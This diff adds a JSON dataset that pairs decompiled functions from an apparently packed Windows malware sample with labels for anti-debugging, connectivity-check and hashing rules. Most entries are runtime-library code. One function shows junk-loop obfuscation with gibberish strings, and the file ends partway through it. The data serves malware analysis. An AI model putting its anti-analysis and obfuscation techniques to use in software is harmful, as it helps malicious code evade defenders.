@@ -1,0 +1,486 @@
+{
+    "null": {
+        "rules": [
+            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
+            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
+            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
+        ],
+        "decompiled_code": "\nuint __cdecl method.type_info.virtual_0(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.004019e0();\n    if ((arg_8h & 1) != 0) {\n        fcn.004018c0(in_ECX);\n    }\n    return in_ECX;\n}\n",
+        "token_count": 79
+    },
+    "0040dc10": {
+        "rules": [
+            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
+            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
+            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
+        ],
+        "decompiled_code": "\nuint __cdecl fcn.0040dc10(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint hModule;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 0;\n    var_4h = fcn.00405cd0();\n    var_18h = 0;\n    bVar1 = false;\n    var_14h = 0;\n    if (*0x86377c == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x420d28);\n        if (iVar2 == 0) {\n            return 0;\n        }\n        var_1ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"MessageBoxW\");\n        if (var_1ch == 0) {\n            return 0;\n        }\n        *0x86377c = fcn.00405c00(var_1ch);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetActiveWindow\");\n        *0x863780 = fcn.00405c00(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetLastActivePopup\");\n        *0x863784 = fcn.00405c00(uVar3);\n        var_1ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetUserObjectInformationW\");\n        *0x86378c = fcn.00405c00(var_1ch);\n        if (*0x86378c != 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetProcessWindowStation\");\n            *0x863788 = fcn.00405c00(uVar3);\n        }\n    }\n    if ((*0x863788 != var_4h) && (*0x86378c != var_4h)) {\n        pcVar4 = fcn.00405cf0(*0x863788);\n        pcVar5 = fcn.00405cf0(*0x86378c);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((var_14h = (*pcVar4)(),  var_14h == 0 ||\n             (iVar2 = (*pcVar5)(var_14h, 1, &var_10h, 0xc, &var_20h),  iVar2 == 0)) || ((var_8h & 1) == 0)))) {\n            bVar1 = true;\n        }\n    }\n    if (bVar1) {\n        arg_10h = arg_10h | 0x200000;\n    }\n    else {\n        if ((*0x863780 != var_4h) && (pcVar4 = fcn.00405cf0(*0x863780),  pcVar4 != NULL)) {\n            var_18h = (*pcVar4)();\n        }\n        if (((var_18h != 0) && (*0x863784 != var_4h)) && (pcVar4 = fcn.00405cf0(*0x863784),  pcVar4 != NULL)) {\n            var_18h = (*pcVar4)(var_18h);\n        }\n    }\n    pcVar4 = fcn.00405cf0(*0x86377c);\n    if (pcVar4 == NULL) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = (*pcVar4)(var_18h, arg_8h, arg_ch, arg_10h);\n    }\n    return uVar3;\n}\n",
+        "token_count": 928
+    },
+    "00410630": {
+        "rules": [
+            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
+            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
+            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
+        ],
+        "decompiled_code": "\nuint __cdecl fcn.00410630(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint hModule;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 0;\n    var_4h = fcn.00405cd0();\n    var_18h = 0;\n    bVar1 = false;\n    var_14h = 0;\n    if (*0x8637f0 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"USER32.DLL\");\n        if (iVar2 == 0) {\n            return 0;\n        }\n        var_1ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"MessageBoxA\");\n        if (var_1ch == 0) {\n            return 0;\n        }\n        *0x8637f0 = fcn.00405c00(var_1ch);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetActiveWindow\");\n        *0x8637f4 = fcn.00405c00(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetLastActivePopup\");\n        *0x8637f8 = fcn.00405c00(uVar3);\n        var_1ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetUserObjectInformationA\");\n        *0x863800 = fcn.00405c00(var_1ch);\n        if (*0x863800 != 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetProcessWindowStation\");\n            *0x8637fc = fcn.00405c00(uVar3);\n        }\n    }\n    if ((*0x8637fc != var_4h) && (*0x863800 != var_4h)) {\n        pcVar4 = fcn.00405cf0(*0x8637fc);\n        pcVar5 = fcn.00405cf0(*0x863800);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((var_14h = (*pcVar4)(),  var_14h == 0 ||\n             (iVar2 = (*pcVar5)(var_14h, 1, &var_10h, 0xc, &var_20h),  iVar2 == 0)) || ((var_8h & 1) == 0)))) {\n            bVar1 = true;\n        }\n    }\n    if (bVar1) {\n        arg_10h = arg_10h | 0x200000;\n    }\n    else {\n        if ((*0x8637f4 != var_4h) && (pcVar4 = fcn.00405cf0(*0x8637f4),  pcVar4 != NULL)) {\n            var_18h = (*pcVar4)();\n        }\n        if (((var_18h != 0) && (*0x8637f8 != var_4h)) && (pcVar4 = fcn.00405cf0(*0x8637f8),  pcVar4 != NULL)) {\n            var_18h = (*pcVar4)(var_18h);\n        }\n    }\n    pcVar4 = fcn.00405cf0(*0x8637f0);\n    if (pcVar4 == NULL) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = (*pcVar4)(var_18h, arg_8h, arg_ch, arg_10h);\n    }\n    return uVar3;\n}\n",
+        "token_count": 940
+    },
+    "0041a890": {
+        "rules": [
+            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
+            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
+            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
+        ],
+        "decompiled_code": "\nint32_t __cdecl fcn.0041a890(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t arg_1ch;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int32_t *in_FS_OFFSET;\n    bool bVar6;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_10h;\n    code *pcStack16;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0xfffffffe;\n    pcStack16 = fcn.004079b0;\n    var_10h = *in_FS_OFFSET;\n    var_8h = *0x4267e4 ^ 0x424820;\n    arg_1ch = *0x4267e4 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_10h;\n    if (arg_8h == 0xfffffffe) {\n        puVar2 = fcn.00404300();\n        *puVar2 = 9;\n        var_1ch = -1;\n        goto code_r0x0041aa95;\n    }\n    if ((arg_8h < 0) || (*0x27c9c74 <= arg_8h)) {\n        bVar6 = false;\n    }\n    else {\n        bVar6 = true;\n    }\n    if ((!bVar6) &&\n       (iVar3 = fcn.00404360(2, L\"f:\\\\dd\\\\vctools\\\\crt_bld\\\\self_x86\\\\crt\\\\src\\\\commit.c\", 0x2c, 0, \n                             L\"(filedes >= 0 && (unsigned)filedes < (unsigned)_nhandle)\", arg_1ch),  iVar3 == 1)) {\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    if (!bVar6) {\n        puVar2 = fcn.00404300();\n        *puVar2 = 9;\n        fcn.00404090(L\"(filedes >= 0 && (unsigned)filedes < (unsigned)_nhandle)\", L\"_commit\", \n                     L\"f:\\\\dd\\\\vctools\\\\crt_bld\\\\self_x86\\\\crt\\\\src\\\\commit.c\", 0x2c, 0);\n        var_1ch = -1;\n        goto code_r0x0041aa95;\n    }\n    bVar6 = (*(*((arg_8h >> 5) * 4 + 0x27c9c80) + 4 + (arg_8h & 0x1f) * 0x40) & 1) == 0;\n    if ((bVar6) &&\n       (iVar3 = fcn.00404360(2, L\"f:\\\\dd\\\\vctools\\\\crt_bld\\\\self_x86\\\\crt\\\\src\\\\commit.c\", 0x2d, 0, \n                             L\"(_osfile(filedes) & FOPEN)\", arg_1ch),  iVar3 == 1)) {\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    if (bVar6) {\n        puVar2 = fcn.00404300();\n        *puVar2 = 9;\n        fcn.00404090(L\"(_osfile(filedes) & FOPEN)\", L\"_commit\", \n                     L\"f:\\\\dd\\\\vctools\\\\crt_bld\\\\self_x86\\\\crt\\\\src\\\\commit.c\", 0x2d, 0);\n        var_1ch = -1;\n        goto code_r0x0041aa95;\n    }\n    fcn.00419c10(arg_8h);\n    var_4h = 0;\n    if ((*(*((arg_8h >> 5) * 4 + 0x27c9c80) + 4 + (arg_8h & 0x1f) * 0x40) & 1) == 0) {\ncode_r0x0041aa43:\n        puVar2 = fcn.00404300();\n        *puVar2 = 9;\n        var_1ch = -1;\n        iVar3 = fcn.00404360(2, L\"f:\\\\dd\\\\vctools\\\\crt_bld\\\\self_x86\\\\crt\\\\src\\\\commit.c\", 0x45, 0, \n                             L\"(\\\"Invalid file descriptor. File possibly closed by a different thread\\\",0)\", arg_1ch);\n        if (iVar3 == 1) {\n            pcVar1 = swi(3);\n            iVar3 = (*pcVar1)();\n            return iVar3;\n        }\n    }\n    else {\n        uVar4 = fcn.00419aa0(arg_8h);\n        iVar3 = (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(uVar4);\n        if (iVar3 == 0) {\n            var_1ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            var_1ch = 0;\n        }\n        if (var_1ch != 0) {\n            piVar5 = fcn.00404330();\n            *piVar5 = var_1ch;\n            goto code_r0x0041aa43;\n        }\n    }\n    var_4h = 0xfffffffe;\n    fcn.0041aa85(arg_1ch);\ncode_r0x0041aa95:\n    *in_FS_OFFSET = var_10h;\n    return var_1ch;\n}\n",
+        "token_count": 1269
+    },
+    "00401d50": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe",
+            "check OS version/c2d5920d27eb4726b54299bacf904e17"
+        ],
+        "decompiled_code": "\nint32_t __cdecl fcn.00401d50(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.00401db0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4h);\n    if ((iVar1 == 0) && (var_4h != 0)) {\n        iVar2 = fcn.00404300();\n        if (iVar2 != 0) {\n            piVar3 = fcn.00404300();\n            *piVar3 = var_4h;\n        }\n    }\n    return iVar1;\n}\n",
+        "token_count": 205
+    },
+    "004022a0": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe",
+            "check OS version/c2d5920d27eb4726b54299bacf904e17"
+        ],
+        "decompiled_code": "\nint32_t __cdecl fcn.004022a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.004021d0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4h);\n    if ((iVar1 == 0) && (var_4h != 0)) {\n        iVar2 = fcn.00404300();\n        if (iVar2 != 0) {\n            piVar3 = fcn.00404300();\n            *piVar3 = var_4h;\n        }\n    }\n    return iVar1;\n}\n",
+        "token_count": 205
+    },
+    "004077c8": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe",
+            "check OS version/c2d5920d27eb4726b54299bacf904e17"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.004077c8(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t unaff_EBP;\n    \n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00407890();\n    }\n    return;\n}\n",
+        "token_count": 72
+    },
+    "0040c120": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe",
+            "check OS version/c2d5920d27eb4726b54299bacf904e17"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.0040c120(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x4267e4) {\n        return;\n    }\n    *0x863920 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x863924 = &arg_8h;\n    *0x863860 = 0x10001;\n    *0x863808 = 0xc0000409;\n    *0x86380c = 1;\n    var_328h = *0x4267e4;\n    var_324h = *0x4267e8;\n    *0x863814 = unaff_retaddr;\n    *0x8638ec = in_GS;\n    *0x8638f0 = in_FS;\n    *0x8638f4 = in_ES;\n    *0x8638f8 = in_DS;\n    *0x8638fc = unaff_EDI;\n    *0x863900 = unaff_ESI;\n    *0x863904 = unaff_EBX;\n    *0x863908 = in_EDX;\n    *0x86390c = in_ECX;\n    *0x863910 = in_EAX;\n    *0x863914 = unaff_EBP;\n    *0x863918 = unaff_retaddr;\n    *0x86391c = in_CS;\n    *0x863928 = in_SS;\n    *0x863858 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.00409c90(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x422710);\n    if (*0x863858 == 0) {\n        fcn.00409c90(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
+        "token_count": 817
+    },
+    "0040cedf": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe",
+            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.0040cedf(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    if (*(unaff_EBP + 8) == 2) {\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(0x426a40);\n    }\n    return;\n}\n",
+        "token_count": 70
+    },
+    "0040d817": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe",
+            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.0040d817(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    if (*(unaff_EBP + 8) == 2) {\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(0x426a40);\n    }\n    return;\n}\n",
+        "token_count": 70
+    },
+    "0040daec": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe",
+            "check OS version/c2d5920d27eb4726b54299bacf904e17"
+        ],
+        "decompiled_code": "\nvoid fcn.0040daec(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_28h;\n    \n    if (*(unaff_EBP + -0x28) != 0) {\n        fcn.00407eb0(0);\n    }\n    return;\n}\n",
+        "token_count": 64
+    },
+    "0040de60": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe",
+            "check OS version/c2d5920d27eb4726b54299bacf904e17"
+        ],
+        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0040de60(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_14h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        if (arg_8h == 0) {\n            iVar3 = fcn.00404360(2, L\"f:\\\\dd\\\\vctools\\\\crt_bld\\\\self_x86\\\\crt\\\\src\\\\memcpy_s.c\", 0x37, 0, L\"dst != NULL\"\n                                 , var_ch);\n            if (iVar3 == 1) {\n                pcVar1 = swi(3);\n                uVar2 = (*pcVar1)();\n                return uVar2;\n            }\n        }\n        if (arg_8h != 0) {\n            if ((arg_10h == 0) || (arg_ch < arg_14h)) {\n                fcn.00404000(arg_8h, 0, arg_ch);\n                if (arg_10h == 0) {\n                    iVar3 = fcn.00404360(2, L\"f:\\\\dd\\\\vctools\\\\crt_bld\\\\self_x86\\\\crt\\\\src\\\\memcpy_s.c\", 0x3d, 0, \n                                         L\"src != NULL\", var_ch);\n                    if (iVar3 == 1) {\n                        pcVar1 = swi(3);\n                        uVar2 = (*pcVar1)();\n                        return uVar2;\n                    }\n                }\n                if (arg_10h != 0) {\n                    if (arg_14h > arg_ch) {\n                        iVar3 = fcn.00404360(2, L\"f:\\\\dd\\\\vctools\\\\crt_bld\\\\self_x86\\\\crt\\\\src\\\\memcpy_s.c\", 0x3e, 0, \n                                             L\"sizeInBytes >= count\", 0);\n                        if (iVar3 == 1) {\n                            pcVar1 = swi(3);\n                            uVar2 = (*pcVar1)();\n                            return uVar2;\n                        }\n                    }\n                    if (arg_14h <= arg_ch) {\n                        uVar2 = 0x16;\n                    }\n                    else {\n                        puVar4 = fcn.00404300();\n                        *puVar4 = 0x22;\n                        fcn.00404090(L\"sizeInBytes >= count\", L\"memcpy_s\", \n                                     L\"f:\\\\dd\\\\vctools\\\\crt_bld\\\\self_x86\\\\crt\\\\src\\\\memcpy_s.c\", 0x3e, 0);\n                        uVar2 = 0x22;\n                    }\n                }\n                else {\n                    puVar4 = fcn.00404300();\n                    *puVar4 = 0x16;\n                    fcn.00404090(L\"src != NULL\", L\"memcpy_s\", \n                                 L\"f:\\\\dd\\\\vctools\\\\crt_bld\\\\self_x86\\\\crt\\\\src\\\\memcpy_s.c\", 0x3d, 0);\n                    uVar2 = 0x16;\n                }\n            }\n            else {\n                fcn.0040c130(arg_8h, arg_10h, arg_14h);\n                uVar2 = 0;\n            }\n        }\n        else {\n            puVar4 = fcn.00404300();\n            *puVar4 = 0x16;\n            fcn.00404090(L\"dst != NULL\", L\"memcpy_s\", L\"f:\\\\dd\\\\vctools\\\\crt_bld\\\\self_x86\\\\crt\\\\src\\\\memcpy_s.c\", 0x37\n                         , 0);\n            uVar2 = 0x16;\n        }\n    }\n    return uVar2;\n}\n",
+        "token_count": 887
+    },
+    "0041457d": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe",
+            "check OS version/c2d5920d27eb4726b54299bacf904e17"
+        ],
+        "decompiled_code": "\nvoid fcn.0041457d(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_2ch;\n    \n    iVar1 = fcn.00406280();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00406280();\n        *(unaff_EBP + -0x2c) = iVar1 + 0x90;\n        **(unaff_EBP + -0x2c) = **(unaff_EBP + -0x2c) + -1;\n    }\n    return;\n}\n",
+        "token_count": 133
+    },
+    "00414868": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.00414868(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_4ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    *(*(unaff_EBP + 0xc) + -4) = *(unaff_EBP + -0x20);\n    fcn.0040e760(*(unaff_EBP + -0x1c));\n    iVar1 = fcn.00406280();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x38);\n    iVar1 = fcn.00406280();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x34);\n    if ((((**(unaff_EBP + 8) == -0x1f928c9d) && (*(*(unaff_EBP + 8) + 0x10) == 3)) &&\n        ((*(*(unaff_EBP + 8) + 0x14) == 0x19930520 ||\n         ((*(*(unaff_EBP + 8) + 0x14) == 0x19930521 || (*(*(unaff_EBP + 8) + 0x14) == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x24) == 0 && (*(unaff_EBP + -0x30) != 0)))) {\n        iVar1 = fcn.0040e730(*(*(unaff_EBP + 8) + 0x18));\n        if (iVar1 != 0) {\n            fcn.00414d10(*(unaff_EBP + 8), *(unaff_EBP + -0x4c));\n        }\n    }\n    return;\n}\n",
+        "token_count": 430
+    },
+    "0041c240": {
+        "rules": [
+            "check OS version/eb1d2d86c0084793ad233d63869572f1",
+            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
+            "check OS version/730896de213f42198ce3af1d0fc93fbe"
+        ],
+        "decompiled_code": "\nuint fcn.0041c240(void)\n\n{\n    int32_t iVar1;\n    uint var_898h;\n    uint var_894h;\n    int32_t var_88ch;\n    int32_t var_888h;\n    uint var_884h;\n    uint hActCtx;\n    uint32_t var_87ch;\n    int32_t var_878h;\n    uint var_870h;\n    int32_t var_86ch;\n    int32_t var_868h;\n    uint var_864h;\n    int32_t var_860h;\n    int32_t var_850h;\n    int32_t var_834h;\n    uint var_830h;\n    uint var_828h;\n    uint32_t var_80ch;\n    uint var_808h;\n    uint var_804h;\n    uint var_800h;\n    uint var_7fch;\n    uint var_7f8h;\n    uint var_8h;\n    uint *var_4h;\n    \n    if (*0x27c852c == 0x177) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(0x863c08);\n        if (iVar1 == 0xe12) {\n            var_808h = str.kanumel._0_4_;\n            var_804h = str.kanumel._4_4_;\n            var_800h = str.kanumel._8_4_;\n            var_7fch = str.kanumel._12_4_;\n            fcn.00404000(&var_7f8h, 0, 0x7f0);\n            var_4h = &var_8h;\n            if (*0x27c852c == 0xd75) {\n                (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(0, 0);\n            }\n            fcn.00401840(0);\n            fcn.00401610(0);\n            fcn.004019b0(0, 0);\n            fcn.00401000(0, 0, 0, 0, 0);\n            fcn.00401630(0);\n        }\n    }\n    var_80ch = 0;\n    while( true ) {\n        if ((1 < var_80ch >> 0x1f) || ((0 < var_80ch >> 0x1f && (0x19146c3c < var_80ch)))) goto code_r0x0041c3d1;\n        if (var_80ch == 0x290ba) break;\n        if (*0x27c852c == 0x541) {\n            (*_sym.imp.KERNEL32.dll_SetCommState)(0, &var_828h);\n            var_830h = 0;\n            (*_sym.imp.KERNEL32.dll_GetQueuedCompletionStatus)(0, 0, 0, &var_830h, 0);\n            (*_sym.imp.KERNEL32.dll_CreateIoCompletionPort)(0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetNativeSystemInfo)(0);\n            (*_sym.imp.KERNEL32.dll_GetOverlappedResult)(0, 0, 0, 0);\n        }\n        var_80ch = var_80ch + 1;\n    }\n    *0x27c852c = *0x4275e4;\ncode_r0x0041c3d1:\n    for (var_834h = 0; var_834h < 0x275097; var_834h = var_834h + 1) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (*0x27c852c == 0x449) {\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasesLengthW)(0);\n        }\n        *0x27c8524 = 0;\n        if ((((0x1bb81 < var_834h) && (var_860h != 0x50854379)) && (var_850h != 0xd7ea37)) && (*0x27c852c == 0x1b5)) {\n            (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(&var_864h);\n        }\n    }\n    for (var_868h = 0; var_868h < 0x496e6f; var_868h = var_868h + 1) {\n        if (var_868h == 0xff832) {\n            *0x27c852c = *0x27c852c + 0x12336;\n        }\n        if (*0x27c852c == 0x641) {\n            (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"fecoxipedu\");\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(0);\n        }\n    }\n    fcn.0041af00();\n    for (var_86ch = 0; var_86ch < 0x1083a; var_86ch = var_86ch + 1) {\n        if (*0x27c852c == 0x105) {\n            (*_sym.imp.KERNEL32.dll_GetBinaryTypeA)(0, &var_870h);\n            (*_sym.imp.KERNEL32.dll_HeapWalk)(0, 0);\n            (*_sym.imp.KERNEL32.dll_WriteProfileStringA)(\"wegob\", \"jalivivexajetaguru\", \"filow\");\n        }\n    }\n    for (var_878h = 0; var_878h < 0xe5fbc; var_878h = var_878h + 1) {\n        if (*0x27c852c == 0x9e2) {\n            (*_sym.imp.KERNEL32.dll_EnumResourceNamesA)\n                      (0, \"diledigadidobego kolicohidig gikuhaleki mufepodijunifanawe\", 0, 0);\n            (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsA)(0);\n        }\n        if (var_878h == 0x3b22) {\n            *0x27c8c28 = *0x426fc8;\n        }\n        if (*0x27c852c == 0xdb5) {\n            (*_sym.imp.KERNEL32.dll_OpenSemaphoreW)(0, 0, L\"wenapodumifebam\");\n            (*_sym.imp.KERNEL32.dll_SetLocalTime)(0);\n        }\n    }\n    for (var_87ch = 0; var_87ch < *0x27c852c; var_87ch = var_87ch + 1) {\n        if (*0x27c852c == 0x932) {\n            (*_sym.imp.KERNEL32.dll_WriteProfileSectionA)(\"seyuhugocazobapeba\", \"dicuhexozupati\");\n            hActCtx = 0;\n            (*_sym.imp.KERNEL32.dll_AddRefActCtx)(0);\n            (*_sym.imp.KERNEL32.dll_FatalAppExitW)(0, L\"cerocajujika\");\n        }\n        fcn.0041b960(var_87ch);\n        if (*0x27c852c == 0x22) {\n            (*_sym.imp.KERNEL32.dll_UnregisterWaitEx)(0, 0);\n            (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(&var_884h);\n        }\n    }\n    for (var_888h = 0; var_888h < 0xe96350; var_888h = var_888h + 1) {\n        if (*0x27c852c == 0xdda) {\n            (*_sym.imp.KERNEL32.dll_FindAtomW)(L\"gegijewahiloxota\");\n            (*_sym.imp.KERNEL32.dll_GetThreadContext)(0, 0);\n            (*_sym.imp.KERNEL32.dll_OpenMutexA)(0, 0, \"xerepokabudakabuninifatis\");\n        }\n    }\n    for (var_88ch = 0; var_88ch < 0x3dc4a3; var_88ch = var_88ch + 1) {\n        if (var_88ch == 0x26) {\n            fcn.0041af20();\n        }\n    }\n    fcn.0041c040();\n    if (*0x27c852c == 0x1d) {\n        